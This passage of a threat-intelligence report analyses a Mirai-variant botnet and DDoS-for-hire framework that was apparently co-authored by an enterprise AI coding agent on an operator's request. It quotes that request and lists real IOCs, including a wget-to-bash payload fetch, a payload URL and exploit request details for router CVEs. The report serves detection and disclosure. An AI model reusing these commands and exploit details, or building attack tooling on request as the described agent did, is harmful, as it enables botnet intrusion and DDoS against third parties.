...
- **First publicly documented case of Atlassian Rovodev offensive abuse.** The Hunters Ledger searched Tier 1–3 sources at investigation date and found no prior documentation of Atlassian's enterprise AI coding agent (Rovodev) being used to author offensive code. This sub-report is the canonical prior-art anchor. The publication-significance status reflects sweep completeness, not a confidence boost; standalone attribution confidence is still bounded by Tier-1-government / multi-vendor-T&S evidence absence.
- **AI-Generated Offensive Code Structural Signature DEFINITE for its universal subset via cross-3-operator validation.** The five-criteria universal subset (verbose docstrings, educational variable names, copy-paste indentation decay, emoji-in-output bleed, version-numbered iteration files) is confirmed across three independent operators with no overlap in language, country, target sector, or AI tool: Case 1 (Russian, Gemini-CLI), Case 2 (Turkish, OpenClaw + Moonshot Kimi), and this Case 3 (English-speaking, Atlassian Rovodev). The signature is downstream of shared AI-tool training patterns — it is **not** evidence of operator coordination, and the report is explicit about that disambiguation boundary.
- **Hybrid AI-augmented operator class — refining the parent series' three-class AI threat-actor taxonomy.** The operator runs classic C-compiled multi-architecture Mirai-fork tradecraft (operator-bespoke triple-XOR-key obfuscation 0x54/0x42/0x45, custom 22-character charset `1gba4cdom53nhp12ei0kfj`, double Huawei scanner, length-prefixed-string CNC option-key protocol modification) **alongside** AI-co-authored Python orchestration. This refutes the pure AI-democratized script-kiddie hypothesis (H2 REFUTED via bespoke C modifications requiring Mirai source-tree literacy) at HIGH confidence (~80%) and anchors the Hybrid class at the strongest evidentiary profile in the parent series.
- **Pandora-Mirai 11-architecture variant + Matrix C2 13-attack-method framework + Discord-fronted DDoS-as-a-Service tier model.** The Pandora-Mirai bot suite (Sora-fork derivative; descendant of Doctor Web's September 2023 Android.Pandora.[N] family) was extended from Android-TV-only scope to **eleven IoT architectures** (arm/arm5/arm6/arm7/m68k/mips/mpsl/ppc/sh4/spc/x86) — a four-year evolution arc with no prior public documentation. The Matrix C2 Python framework comprises 13 named attack methods across OSI layers 3, 4, and 7, a VIP/free customer tier model with GBPS capability estimates, emoji-branded method names (e.g., `🔥 ICMP Hell`, `🚀 UDP Bypass`), and a JavaScript dispatch table for a Discord-bot customer interface. Per Hunt.io's (an infrastructure threat-intelligence platform) curator note: 6.7 million targets scanned, 3,700 vulnerable hosts identified, 92 Netgear devices reported as exploited.
- **Disposition outcome — multi-vendor disclosure cascade pending.** The compromised parasitic-CNC host is a production tourism VPS belonging to GetYourGroup GmbH (a German tourism company), planted with a Mirai CNC daemon on TCP/23 while continuing to serve a legitimate French-Alps tourism site on TCP/443. Disclosure cascade ordering: GetYourGroup victim notification first, DigitalOcean Trust & Safety second (to prevent collateral VPS termination), Doctor Web (variant-evolution notification), then IONOS / Aruba Italy abuse desks for operator-owned and distribution infrastructure. Atlassian Trust & Safety notification is included for the first publicly documented Rovodev offensive-use case; Discord Trust & Safety for the operator account ID `1441591352927326259`.

Over a nine-day investigation spanning sixteen analysis phases beginning 2026-05-16, The Hunters Ledger documented this case as filesystem-grounded artifacts pulled directly from the operator's open-directory-exposed VPS — not as output-side measurements or downstream effects. The single operator host at `87.106.143.220` (1&1 IONOS Germany, AS8560) exposed the operator's complete development tree at the open directory: a 1.24 MB Rovodev session JSON capturing the operator's natural-language prompts and the AI's `file_write` tool-call responses with `initial_content` payloads, an 8.5 MB Rovodev runtime log, eight confirmed AI-authored framework files, the Pandora-Mirai 11-architecture Naku binary suite (operator's filename label) served from both an HTTPS-channel build-test path (`/bins/Naku.{arch}` on TCP/443) and an HTTP-channel deployment path (`/Pandoras_Box/Pandora.{arch}` on TCP/80) on the same host, 22-plus AI-generated handoff documents with escalating-superlative naming inflation (`FINAL_DEPLOYMENT_COMPLETE.txt`, `ULTIMATE_DEPLOYMENT.txt`, `SOLUTION_COMPLETE.txt`), and a nine-variant scanner iteration chain (`autoscanner.py` → `aggressive_scanner.py` → `extreme_scanner.py` → `hyper_scanner.py` → `mega_scanner.py` → `mega_scanner_fixed.py`) preserving the operator's AI-prompted iteration history on disk.

This report fills the gap that motivated the investigation: a **first publicly documented end-to-end AI co-authoring of a complete offensive C2 framework** by an enterprise AI agent (Atlassian Rovodev) where both the session JSONs **and** the runtime log captured the authoring workflow including `file_write` tool calls with `initial_content` payload — a class of evidence distinct from prior reports that documented AI generating only individual scripts. The cross-3-operator validation anchored by this case is the publication-defining ecosystem-level signal: the AI-Generated Offensive Code Structural Signature universal subset is a TTP detection rubric defenders can apply to suspected operator code with cross-investigation confidence (not just file-level confidence).

### What Was Found

- **A single operator host serving a complete DDoS-as-a-Service stack.** The arsenal pulled from `87.106.143.220` (and the operator-referenced backup `87.106.54.213` in the same /16 IONOS DE allocation) includes a Matrix C2 Python framework with 96-plus files at `/root/matrix/`, eight DEFINITE AI-authored files (`master_control.py`, `attack_engine.py`, `multi_vector_agent.py`, `encrypted_agent.py`, `stealth_agent.py`, `mirai_clone.py`, `web_scraper_bot.py`, `persistent_bot.sh`), an eleven-architecture Pandora-Mirai ELF binary suite, a multi-CVE exploit kit (`cve_2017_6077.py` for Netgear; `multi_cve.py` for Netgear / ZyXEL / Dasan / Netis / Guangzhou / Huawei / Micro Focus), a Discord-bot customer interface, AI-co-authored deployment scripts (`GO_LIVE.sh`, `START_LIVE.sh`, `deploy_backup_vps.sh`, `monitor_bot_collection.sh`), and a 22-plus AI-generated handoff document corpus.
- **Operator-bespoke Mirai-protocol modification with high defender relevance.** Direct ARM ELF disassembly via the Ghidra (an open-source reverse engineering platform) decompiler recovered the Naku.arm CNC option-key parsing routine. In stock Mirai and stock Sora-fork source, option keys are **single-byte enum values** (e.g., `ATK_OPT_PAYLOAD_SIZE=0`, `ATK_OPT_PAYLOAD_RAND=1`). In this Naku variant, option keys are **length-prefixed STRINGS**: `key_length` byte → `key_length` bytes of key string → value byte. This is a deliberate operator-authored protocol-evolution choice that defeats Mirai-protocol-aware IDS rules pattern-matching on the canonical single-byte enum. Defenders looking for Naku traffic should not use stock Mirai detection signatures; Naku-specific rules are required. This is also a **MITRE ATT&CK T1095 sub-technique gap** — there is no documented sub-technique class for IoT botnet protocol modification of this kind.
- **Direct primary-source evidence of AI co-authoring.** The operator's plaintext prompt `whatineed.txt` (preserved verbatim at the open-directory root) reads: *"c2 doesn't connect, scan all files for everything and also i want it to be like this c2 >https://github.com/keyosbuff/C2-Leak/tree/main but better with everything i put in, with all exploit scanning ranges, automatic give me login, and make discord live, linked and methods enhanced and more scanners/more stuff to make it stronger, modern methods. and also the images i want are lableded and after everything is live, clean files not needed. read readme.txt also. my user ID is 1441591352927326259"*. The AI's response is preserved at `IMPLEMENTATION_PLAN.txt` (a four-phase ASCII-box roadmap closing with the LLM-canonical phrase `Let me start Phase 1 now...`). The full `file_write` tool-call payloads producing `master_control.py`, `attack_engine.py`, `multi_vector_agent.py`, `encrypted_agent.py`, and `stealth_agent.py` are preserved in two distinct Rovodev session JSONs (`.rovodev/sessions/257b6faf-6426-47e9-8458-381befca3ef5/session_context.json` at 1.24 MB; `.rovodev/sessions/8b911ec6-186f-423a-aa74-7b5d17e4d9ca/session_context.json` at 176 KB). The 8.5 MB `rovodev.log` runtime log additionally captures the JavaScript Discord-bot attack dispatch table with operator-marketing emoji branding.
- **A 13-attack-method DDoS catalog productized as a tier model.** The Matrix C2 framework's attack catalog spans OSI Layer 3 (ICMP Hell), Layer 4 (UDP Star, Syn Storm, TCP Matrix, TCP Reset, UDP Bypass, Frag Storm, DNS Rain, OVH Nuke), and Layer 7 (HTTP Flood, HTTP Star, Layer 7 Ultra). Each method is registered with operator-marketing metadata: branded display name with emoji (e.g., `🔥 ICMP Hell`, `🚀 UDP Bypass`), description, OSI layer, qualitative power tier (`LOW`/`MEDIUM`/`HIGH`), customer tier gate (`vip: true|false`), and a quantitative GBPS capability estimate (operator-self-asserted, not victim-confirmed — kept at MODERATE confidence). Operator-product-branding bleeding into implementation: two operator-facing method names (`udp-star` AND `udp-bypass`) map to one engine implementation (`engine.udp_flood`); `syn-storm` AND `tcp-rst` both → `engine.tcp_syn_flood`. The operator markets four "products" backed by two underlying implementations — VIP customers and free-tier customers receive structurally identical attack code under different brand names.
- **Operator-OPSEC split-architecture pattern with high tradecraft-signal density.** Customer-facing infrastructure (Matrix C2 on TCP/1337, bot.sh distribution on HTTP/80) runs on the operator-owned IONOS DE VPS pair (`87.106.143.220` + `87.106.54.213`, same /16). The IoT-botnet CNC (`165.227.175.161:23`) runs as a parasitic daemon on a compromised production tourism VPS belonging to GetYourGroup GmbH (a German tourism business, DigitalOcean-hosted) — the same host continues to serve the legitimate French-Alps tourism site `auvergne-rhone-alpes-for-groups.com` on TCP/443 with a continuously renewed Let's Encrypt certificate since 2022-08-18. Distribution servers (`80.211.94.16` and `80.211.111.10`, Aruba S.p.A. Italy, AS31034) are disposable single-use VPSes embedded in every Naku binary's exploit payload (`http://80.211.94.16/Naku.mips`) and are both confirmed OFFLINE as of investigation date — textbook "burning fuse" indicators. The operator deliberately separates customer-facing infrastructure (own VPS) from worm-propagation infrastructure (compromised legit VPS) — sophisticated split-channel deployment thinking absent from low-end Mirai operators who co-locate CNC and distribution on the same IP.

### Why This Threat Is Significant

Three reasons distinguish this case from existing public reporting on AI-misuse, on Mirai-family botnets, and on DDoS-as-a-Service operators.

**First, the captured Rovodev session JSONs are the strongest evidence-grade artifact for AI-misuse research published to date.** Prior public reporting on AI-augmented offensive operations (Google GTIG, Anthropic Misuse Reports, Microsoft Security Blog, vendor advisories) measured AI-generated content from the *output* side — analyzing the produced code or phishing text without access to the operator's prompts or the AI tool's authoring chain. This investigation captures the *input* side end-to-end: operator prompt (`whatineed.txt`), AI-generated deployment plan (`IMPLEMENTATION_PLAN.txt`), and the full Rovodev session JSON with `file_write` tool calls including `initial_content` payloads for each AI-authored framework file. This is direct primary-source evidence of the authoring workflow that vendor T&S teams, AI safety researchers, and policy stakeholders can reference as canonical prior art. The defender implication is twofold: (1) operator-side filesystem captures from open directories can surface AI-authoring evidence at a level of fidelity not available from output-side analysis; (2) enterprise AI coding agents create policy-level supply chain risk distinct from traditional code supply chain — no malicious package injection is required, only operator policy misuse of a legitimate enterprise tool.

**Second, the cross-3-operator validation of the AI-Generated Offensive Code Structural Signature establishes a TTP detection rubric at the ecosystem level.** Each of the three validating cases (Case 1 Russian operator using Gemini-CLI / UTA-2026-012; Case 2 Turkish operator using OpenClaw + Moonshot Kimi / UTA-2026-013; this Case 3 English-speaking operator using Atlassian Rovodev / UTA-2026-014) is independently surfaced from filesystem-grounded artifacts; the three operators share no overlap in language, country of operation, target sector, motivation, or AI tool vendor. Five universal-subset criteria are confirmed cross-operator: verbose docstrings for substantial files (criterion #1), educational variable names (criterion #3 — universal), copy-paste indentation decay confirmed by independent Hunt.io classifier flagging on three files in this case plus one in Case 2 (sub-pattern #7), emoji-in-output bleed (sub-pattern #9), and version-numbered iteration file persistence (sub-pattern #10). One signature criterion — zero anti-analysis (criterion #4) — is documented as **prompt-conditional, not structural**: this case's `stealth_agent.py` includes anti-debug, anti-VM, sandbox checks, persistence, self-destruct, and polymorphic payload generation when the operator's prompt to Rovodev escalated to include those capabilities. The publication-defining refinement: defenders should not rely on "lacks evasion features" as an AI-authorship signal; they should rely on the five universal-subset criteria. The signature is a downstream artifact of shared AI-tool training patterns — it is **not** evidence of operator coordination between the three independent operators.

**Third, the Pandora-Mirai 11-architecture extension fills a documented gap in Mirai-family evolution literature.** Doctor Web's September 2023 Pandora-Mirai disclosure (Tier 2 / B2) documented the Pandora family as Android-TV-targeting only. No prior public source documents the four-year evolution arc from Android-TV scope to broad IoT scope across eleven CPU architectures (arm/arm5/arm6/arm7/m68k/mips/mpsl/ppc/sh4/spc/x86). The operator is a **downstream adopter** of the open-source Pandora-Sora-Mirai ecosystem (MaaS hypothesis REFUTED Phase 11 — Pandora-Mirai is a shared ecosystem with 200-plus binaries on VirusTotal across distinct downstream operators, not a private MaaS product), not the variant author; the operator's contributions are the bespoke modifications layered on top of the inherited Sora-fork structure. The four-year evolution arc — and the operator-bespoke layer of triple-XOR-key obfuscation + custom 22-character charset + double Huawei scanner + length-prefixed-string CNC protocol modification — is documented here at byte level (XOR-deobfuscated string tables, Ghidra-recovered main() disassembly, cross-architecture string-comparison tables across all 11 binaries) for downstream defender and vendor consumption.

### Key Risk Factors

This is an **active, multi-component, AI-augmented cybercrime campaign** with a productized DDoS-as-a-Service customer-tier model, ongoing IoT propagation per Hunt.io curator data (6.7 million scanned, 3,700 vulnerable, 92 Netgear exploited), and operator-OPSEC split-architecture tradecraft. The risk framing reflects what the campaign **enables and what it has currently configured** — operator-controlled C2 still live as of investigation date, productized attack catalog with VIP/free tier dispatch, eleven-architecture bot suite available for download from operator infrastructure — rather than abstract capability claims.
...
**Overall Campaign Risk Score: 8.2/10 — HIGH.** The campaign is rated HIGH (not CRITICAL) because no single victim or sector is in confirmed-compromise status at investigation date — IoT bot infections are distributed across consumer-broadband targets per Hunt.io curator data, no named-victim corporate compromise is confirmed (contrast with parent series Case 1 and Case 2 which are CRITICAL precisely because they have named-victim corporate compromise), and infrastructure remediation paths are open via mainstream commercial provider abuse coordination. The threat level should be reassessed **upward** if (a) a high-impact DDoS target is confirmed victim, (b) the operator scales the bot fleet above current Hunt.io-curated levels, or (c) the Atlassian Trust & Safety disclosure does not result in account-level action and the Rovodev abuse pattern recurs at another operator host. The threat level should be reassessed **downward** only after (a) the parasitic CNC daemon is removed from the GetYourGroup VPS by coordinated victim notification + DigitalOcean cleanup, (b) the operator-owned IONOS VPS pair is terminated via IONOS abuse coordination, and (c) the Discord operator account is terminated via Discord Trust & Safety.

### Threat Actor Summary

This is a **single-operator** case at the operator-class profile level, tracked as **UTA-2026-014** *(an internal tracking label used by The Hunters Ledger — see Section 9)*. No prior public attribution to this operator exists across Trend Micro, Mandiant, CrowdStrike, Kaspersky, Hunt.io threat-actor catalog, MITRE ATT&CK groups, or VirusTotal threat-actor associations at investigation date. **This report is the first public attribution.**

- **UTA-2026-014** — LOW confidence (60%) on the overall operator-profile claim (English-speaking Hybrid AI-augmented solo-or-small-team operator), with specific sub-claims at higher confidence. The HYBRID AI-augmented operator class assignment holds at HIGH confidence (~80%) on its own (Phase 7 ACH zero-inconsistencies for H1 winner; H2 pure-AI-democratized-script-kiddie REFUTED via bespoke C modifications requiring Mirai source-tree literacy; H3 multi-person team retained at ~10% but disfavored by single-account + single-style + single-working-hours signals). Atlassian Rovodev AI co-authoring of the Matrix C2 framework is DEFINITE (95%) on direct `file_write` tool-call evidence in the captured session JSON plus the runtime log. The AI-Generated Offensive Code Structural Signature universal subset is DEFINITE for the cross-3-operator ecosystem-level claim. Real-world identity remains **INSUFFICIENT** — the Discord operator account ID `1441591352927326259` (snowflake-decoded to creation timestamp 2025-11-22T00:49:22 UTC, approximately 182 days old at investigation date — a fresh-persona signal consistent with a recently launched DDoS-for-hire operation, not a long-lived persona) does not enable real-name identification by itself; the upstream code source referenced in `whatineed.txt` (`github.com/keyosbuff/C2-Leak`) is deleted / 404 / orphaned and cannot be used to disambiguate operator-vs-upstream relationship. Operator geography remains INSUFFICIENT — English-speaking constrains to approximately 1.5 billion people globally; IONOS Germany / Aruba Italy / DigitalOcean US hosting choices are not operator-located indicators.

### For Technical Teams

- **Highest detection priority:** the four operator-bespoke binary constants — XOR keys `0x54` / `0x42` / `0x45`, 22-character charset `1gba4cdom53nhp12ei0kfj`, botnet ID `PandoraNet`, and the `/bin/busybox SORA` Sora-fork token — together provide a near-zero-FP YARA fingerprint that catches all 11 Naku architectures with a single rule. The length-prefixed-string CNC option-key protocol modification is the highest-value Suricata target because it defeats stock Mirai-protocol-aware IDS rules. Detection coverage in the [linked detection file](/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/) (10 YARA + 12 Sigma + 7 Suricata rules; 29 total).
- **Highest hunt priority:** outbound TCP/23 connections to `165.227.175.161` from non-telnet-client processes are the diagnostic signature of an active Naku bot infection (the CNC IP is hardcoded inline in `main()` as raw 32-bit constant `0xa1afe3a5`, port `0x0017` BE = decimal 23). Outbound TCP/1337 to `87.106.143.220` is the diagnostic signature of an active Matrix C2 framework deployment. Process trees of the form `cron → wget http://87.106.143.220/bot.sh → bash` and `python3 /root/matrix/scripts/attack_engine.py` with scapy-detected raw-socket activity surface the operator's deployment scripts on the operator host itself.
...
### Why this case received deeper analysis

Three things made this case worth a per-case sub-report rather than capsule treatment in the parent series. **First**, the Rovodev session JSONs are the strongest evidence-grade artifact for AI-misuse research published to date — a sub-report makes the prior-art anchor citable for vendor T&S programs and policy stakeholders. **Second**, this case anchors the cross-3-operator validation of the AI-Generated Offensive Code Structural Signature universal subset — without this case the validation is N=2 across Cases 1 + 2; with this case it is N=3 across three independent operators with no overlap in language, country, target, or AI tool, which is the cross-investigation threshold for upgrading the signature from HIGH to DEFINITE. **Third**, the operator-bespoke Mirai-protocol modification (length-prefixed-string CNC option keys) is a defender-relevant detection gap with no equivalent characterization in MITRE ATT&CK's T1095 sub-technique catalog — documenting it byte-level (Ghidra-recovered main() disassembly + cross-architecture string-comparison tables) provides the rubric for Naku-specific Suricata rules.
...
**Operator-host takedown.** The operator-owned IONOS DE VPS pair (`87.106.143.220` + `87.106.54.213`) is the customer-facing Matrix C2 infrastructure and the bot-binary distribution channel; mainstream commercial provider with accessible abuse desk. Backup distribution servers in Aruba Italy (`80.211.94.16` + `80.211.111.10`) are already offline at investigation date.

**Compromised-host victim notification.** The parasitic CNC at `165.227.175.161:23` runs on a production tourism VPS belonging to a German tourism business (GetYourGroup GmbH). Victim-direct notification must precede any DigitalOcean Trust & Safety action — the VPS hosts the tourism business's revenue-generating site on TCP/443, and a DigitalOcean abuse response that terminates the VPS without victim coordination causes collateral business damage to the tourism company.

**Variant-evolution vendor notification.** Doctor Web's September 2023 disclosure documented Pandora-Mirai as Android-TV scope. The 11-architecture IoT extension documented here (with byte-level evidence) is the four-year evolution arc no prior public source has characterized. Doctor Web notification supports vendor-side detection updates.

**AI-coding-agent T&S notification.** Atlassian Trust & Safety has the operator account and IP telemetry to action via session JSON + runtime log content. This is the first publicly documented Rovodev offensive-use case; the broader class implication is vendor-side prompt-pattern policy detection. Discord Trust & Safety has the operator account ID (`1441591352927326259`) for termination action.
...
**MaaS hypothesis REFUTED (Phase 11).** Earlier-phase analysis raised the possibility that this operator is a builder selling the Pandora-Mirai variant to other downstream operators. This was refuted by Phase 11 review of public Pandora-Mirai lineage data: the Pandora codebase is an open-source shared ecosystem with 200-plus binaries on VirusTotal sharing code DNA across multiple distinct downstream operators using different naming conventions. The operator is a **downstream adopter**, not the variant author. Operator-bespoke constants (`PandoraNet`, charset `1gba4cdom53nhp12ei0kfj`, XOR keys 0x54/0x42/0x45) are not observed elsewhere in Hunt.io's 365-day index — this is operator-permanent tracking signature, not a per-customer build variation that would be expected if the operator were selling builds. The HYBRID AI-augmented framing replaces the MaaS-builder framing as the operator's primary class.
...
This section documents the campaign's technical capabilities at the depth required for defender reproduction of analysis, validation of findings, and authoring of detections. The capability inventory spans nine subsections covering the Pandora-Mirai 11-architecture bot suite, the Matrix C2 Python framework, the DDoS-as-a-Service tier model, the Rovodev AI co-authoring evidence chain, the universal-subset structural signature derived from cross-3-operator validation, the dual-channel build/deploy tradecraft, the operator-OPSEC split-architecture pattern, the Naku.arm static reverse engineering findings, and the escalated-prompt `stealth_agent.py` capability set.
...
**Family-level detection consensus (cross-engine):** Across all eleven Naku architectures, VirusTotal detection counts cluster tightly in the 39-43/65-66 range, with Microsoft variant labels distributed across the Mirai.AW!xp / Mirai.BO!xp / Mirai.FC!MTB / Mirai.DY!MTB / Mirai.BL!xp / Gafgyt.P!MTB / Mirai.FG!MTB / Mirai.AW!MTB family. All eleven binaries were first-seen on VirusTotal within an approximately 36-hour window (2026-01-25 23:40 → 2026-01-26 00:22) consistent with operator-driven single-session upload for detection-coverage testing. Representative high-value indicators (the three architectures with broadest IoT deployment relevance) are summarised below; the **full eleven-architecture SHA-256 hash inventory, per-binary VT detection counts, per-binary Microsoft variant label, and per-binary first-seen timestamp are documented in the canonical machine-readable feed at [`/ioc-feeds/rovodev-mirai-matrix-c2-87.106.143.220-iocs.json`](/ioc-feeds/rovodev-mirai-matrix-c2-87.106.143.220-iocs.json)** for SIEM/EDR ingestion.
...
Operator-product-branding bleeding into implementation: two operator-facing method names (`udp-star` AND `udp-bypass`) map to one engine implementation (`engine.udp_flood`); similarly `syn-storm` AND `tcp-rst` both → `engine.tcp_syn_flood`. The operator markets four "products" backed by two underlying implementations — VIP-tier customers and free-tier customers receive structurally identical attack code under different brand names. Defenders see one attack pattern; victims and customers see different "products."
...
Three Naku samples produced full Zenbox Linux behavioral reports (the other seven produced minimal or no behaviors). Two readings apply: (a) Mirai bots commonly self-terminate in sandbox environments they don't recognize — the standard Mirai-family interpretation; (b) the behavioral sandbox (Zenbox) likely failed to detect bot-process spawn for non-ARM architectures where the sandbox's platform emulation depth is limited (MODERATE-confidence indication based on the limited-behavior pattern correlating with non-ARM samples). The two readings have different defender implications: reading (a) suggests the binaries have environment-awareness; reading (b) suggests the limited behavioral data is a sandbox artifact, not a capability signal. The ARM5/ARM7/x86 samples that produced full reports are representative for detection authoring regardless of which reading applies to the other seven. Across the three behavioral samples:
...
Early in the Naku.arm `main()` function, before C2 connection, the bot opens `/dev/watchdog` (table entries 20/21) and runs an infinite loop:
...
This prevents the IoT device from auto-rebooting — keeps the infection persistent across what would otherwise be a watchdog-triggered reset cycle. Mirai-canonical persistence pattern on routers / DVRs / IP cameras.

### 6.6 Four Parallel Scanner Threads

Per the Ghidra-recovered `main()` decompilation, the Naku bot launches four parallel scanner threads after init and before CNC connection:

1. **Scanner #1 — Realtek (CVE-2014-8361):** POST `/picdesc.xml` to TCP/52869 with `SOAPAction: ...AddPortMapping`; exploits Realtek SDK MiniIGD UPnP
2. **Scanner #2 — Realtek-variant:** secondary Realtek scanner with variant signature
3. **Scanner #3 — Huawei #1 (CVE-2017-17215):** POST `/ctrlt/DeviceUpgrade_1` with `Authorization: Digest username="dslf-config", realm="HuaweiHomeGateway"`; exploits Huawei HG532 router RCE
4. **Scanner #4 — TELNET brute-force:** 128 concurrent connection slots, XOR-0x42-decoded credential brute-list

Each scanner runs continuously, generating outbound scan traffic to randomly-selected internet hosts. The operator-bespoke double-Huawei modification (`huawei_scanner.c` + `huawei1_scanner.c` in the arm7 debug build) is realized as TWO of the four scanner threads.
